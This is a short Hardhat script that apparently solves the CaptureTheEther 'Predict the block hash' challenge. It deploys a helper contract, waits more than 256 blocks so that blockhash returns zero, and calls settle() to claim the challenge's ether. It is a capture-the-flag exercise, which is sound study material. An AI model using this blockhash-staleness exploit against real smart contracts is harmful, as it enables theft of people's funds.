const { url } = require('../../secrets.json');

// Using async in order to have the await functionality
(async () => {
	// Getting a signer
	const signer = await hre.ethers.getSigner();
	
	// Challenge contract address (From CaptureTheEther)
	const challengeAddr = "0xb1cfe3D2ca2c80be09b16affb4E8065FFE34EBeD";

	// Deploy contract
	const PredictTheBlockHash = await ethers.getContractFactory("PredictTheBlockHash");
	const predictTheBlockHash = await PredictTheBlockHash.deploy(challengeAddr, {
		gasLimit: 500000,
		value: ethers.utils.parseEther("1.0")
	});

	await predictTheBlockHash.deployed();

	// Wait for 256 blocks so the answer of blockhash is 0
	const secondsBetweenBlocks = 20;
	const secondsToWait = secondsBetweenBlocks * (256 + 1);
	await new Promise(r => setTimeout(r, secondsToWait * 1000));

	// Settle the answer
	let tx = await predictTheBlockHash.settle({
		gasLimit: 250000
	});
	const receipt = await tx.wait();
	console.log(receipt);
})();
